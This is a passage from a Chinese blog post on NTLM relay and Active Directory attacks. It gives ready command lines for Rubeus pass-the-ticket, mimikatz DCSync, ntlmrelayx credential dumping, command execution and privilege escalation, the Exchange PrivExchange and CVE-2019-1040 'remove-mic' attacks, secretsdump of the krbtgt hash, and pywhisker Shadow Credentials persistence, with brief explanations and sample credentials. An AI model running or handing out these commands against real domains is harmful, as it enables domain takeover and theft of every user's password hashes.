+<p>Rubeus.exe asktgt /user:WIN-8NUIJ5CPB71$ /certificate:<code>base64cert</code> /domain:adc.com /dc:10.10.10.10 /ptt</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png"
+        data-srcset="https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png, https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png 1.5x, https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png"
+        title="image.png" /></p>
+<p>mimikatz</p>
+<p><code>lsadump::dcsync /all</code></p>
+<h3 id="cred-dump">Cred Dump</h3>
+<p>ntlmrelayx.py -t smb://$TARGET</p>
+<h3 id="exec">EXEC</h3>
+<p>ntlmrelayx.py -t smb://$TARGET -c whoami</p>
+<h3 id="枚举信息">枚举信息</h3>
+<p>ntlmrelayx -t &ldquo;ldap://domaincontroller&rdquo; &ndash;dump-adcs &ndash;dump-laps &ndash;dump-gmsa</p>
+<h3 id="创建用户ldaps">创建用户（LDAPS）</h3>
+<p>ntlmrelayx.py -t ldaps://<strong>$DC_TARGET</strong> &ndash;add-computer username</p>
+<h3 id="exchange高权限">Exchange（高权限）</h3>
+<p><strong>存在CVE-2019-1040漏洞的情况下，可以从SMB-&gt;LDAP(s)。而无需考虑签名的情况。</strong></p>
+<p>Exchange的机器账户对域有WriteDACL权限。即可以赋予任意用户两条ACE：</p>
+<ul>
+<li>复制目录更改</li>
+<li>复制目录更改所有项</li>
+</ul>
+<p>这样该用户就具备了Dcsync权限，从而可以导出域内所有用户Hash。</p>
+<p>当exchange存在SSRF漏洞(<a href="https://github.com/dirkjanm/PrivExchange" target="_blank" rel="noopener noreffer">CVE-2018-8581</a>)时。可触发http类型的NTLM认证。不需要考虑签名问题。</p>
+<p>python3 privexchange.py -d ddc.com -u test1 -p song@2020 -ah 10.10.10.123  10.10.10.21</p>
+<p><strong>等待一分钟</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png"
+        data-srcset="https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png, https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png 1.5x, https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png"
+        title="image.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png"
+        data-srcset="https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png, https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png 1.5x, https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png"
+        title="image.png" /></p>
+<p>没有SSRF时，可通过触发SMB类型流量结合CVE-2019-1040移除MIC完整型检验.</p>
+<p>python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug &ndash;escalate-user wukong &ndash;remove-mic</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png"
+        data-srcset="https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png, https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png 1.5x, https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png"
+        title="image.png" /></p>
+<p>python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -debug -just-dc-user krbtgt</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png"
+        data-srcset="https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png, https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png 1.5x, https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png"
+        title="image.png" /></p>
+<h3 id="影子凭证shadow-credentials">影子凭证（Shadow Credentials）</h3>
+<p>隐蔽权限维持。</p>
+<blockquote>
+<p>常规Kerberos预认证阶段（pre-auth），客户端用自己的hash加密时间戳给KDC。KDC使用该用户的hash解密，验证通过后返回该用户的TGT。这是对称加密（DES、RC4、AES128、AES256）。Kerberos也支持非对称的认证方式，通过证书（PKINIT）或密钥对实现。需要安装ADCS。​</p>
+</blockquote>
+<blockquote>
+<p>Microsoft 还引入了密钥信任的概念，以在不支持证书信任的环境中支持无密码身份验证。在 Key Trust 模型下，PKINIT 身份验证是基于原始密钥数据而不是证书建立的。</p>
+</blockquote>
+<p><figure><a class="lightgallery" href="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png" title="image.png" data-thumbnail="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png" data-sub-html="<h2>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</h2><p>image.png</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png"
+            data-srcset="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png, https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png 1.5x, https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png 2x"
+            data-sizes="auto"
+            alt="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png" />
+    </a><figcaption class="image-caption">https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</figcaption>
+    </figure></p>
+<p><figure><a class="lightgallery" href="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png" title="image.png" data-thumbnail="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png" data-sub-html="<h2>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</h2><p>image.png</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png"
+            data-srcset="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png, https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png 1.5x, https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png 2x"
+            data-sizes="auto"
+            alt="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png" />
+    </a><figcaption class="image-caption">https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</figcaption>
+    </figure></p>
+<p>简单来说就是客户端有自己的一对密钥，KDC也存着用户的公钥。使用私钥加密预认证信息发给KDC，KDC使用用户的公钥解密，验证通过返回TGT。</p>
+<p>Windows server2016引进了一个属性<code>msDS-KeyCredentialLink</code>。</p>
+<blockquote>
+<p>该属性的值是 Key Credentials，它是包含创建日期、所有者可分辨名称等信息的序列化对象，一个代表设备 ID 的 GUID，当然还有公钥。这是一个多值属性，因为一个帐户有多个链接设备。</p>
+</blockquote>
+<p>我的理解：我们伪造一个密钥对，通过修改msDS-KeyCredentialLink为我们伪造的公钥，AS_REQ发送伪造的公钥和伪造私钥加密的时间戳，KDC验证AS_REQ中的公钥和msDS-KeyCredentialLink的公钥，然后再用公钥解密。验证通过后返回TGT。</p>
+<p><strong>利用</strong>：</p>
+<p>首先需要给一个机器新增msDS-KeyCredentialLink。机器账户可以给自己新增。高权限账户可以给其他账户新增。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 pywhisker.py -d <span class="s2">&#34;adc.com&#34;</span> -u <span class="s2">&#34;administrator&#34;</span> -p <span class="s2">&#34;sss@123&#34;</span> --target <span class="s2">&#34;yangguo&#34;</span> --action <span class="s2">&#34;list&#34;</span>  --dc-ip 10.10.10.10
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png"
+        data-srcset="https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png, https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png 1.5x, https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png"
+        title="image.png" /></p>
+<p>第一次大概率会遇到下面的错误。需要去域控上注册证书。<a href="https://support.citrix.com/article/CTX218941" target="_blank" rel="noopener noreffer">FAS - Request not supported while launching a published Desktop with FAS</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png"
+        data-srcset="https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png, https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png 1.5x, https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png"
+        title="image.png" /></p>
+<p><strong>获取hash</strong>：原理看下面这段话</p>
+<p><figure><a class="lightgallery" href="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png" title="image.png" data-thumbnail="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png" data-sub-html="<h2>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</h2><p>image.png</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png"
+            data-srcset="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png, https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png 1.5x, https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png 2x"
+            data-sizes="auto"
+            alt="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png" />
+    </a><figcaption class="image-caption">https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</figcaption>
+    </figure></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png"
+        data-srcset="https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png, https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png 1.5x, https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png 2x"
+        data-sizes="auto"
+        alt="https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png"
+        title="image.png" /></p>
+<h3 id="rbcd低权限">RBCD（低权限）</h3>
+<p>当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。</p>
+<h2 id="参考">参考</h2>
+<p><a href="https://www.thehacker.recipes/ad/movement/ntlm/relay" target="_blank" rel="noopener noreffer">Relay - The Hacker Recipes</a></p>
+<p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian" target="_blank" rel="noopener noreffer">NTLM 篇 - windows protocol</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484864&amp;idx=1&amp;sn=94260cb4a4e643764f4cfd3565ae799b" target="_blank" rel="noopener noreffer">[域渗透] SQLSERVER 结合中继与委派</a></p>
+<p><a href="https://mp.weixin.qq.com/s/jtHJZUZpDVHa-P7NjwhhYQ" target="_blank" rel="noopener noreffer">安全研究 | 使用PetitPotam代替Printerbug</a></p>
+<p><a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab" target="_blank" rel="noopener noreffer">Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-02-18</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/ntlm-relay/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/" class="prev" rel="prev" title="Adb卸载手机原装软件"><i class="fas fa-angle-left fa-fw"></i>Adb卸载手机原装软件</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">nmk</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"data":{"id-1":"Nmk","id-2":"Nmk"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":" $","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":1000}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
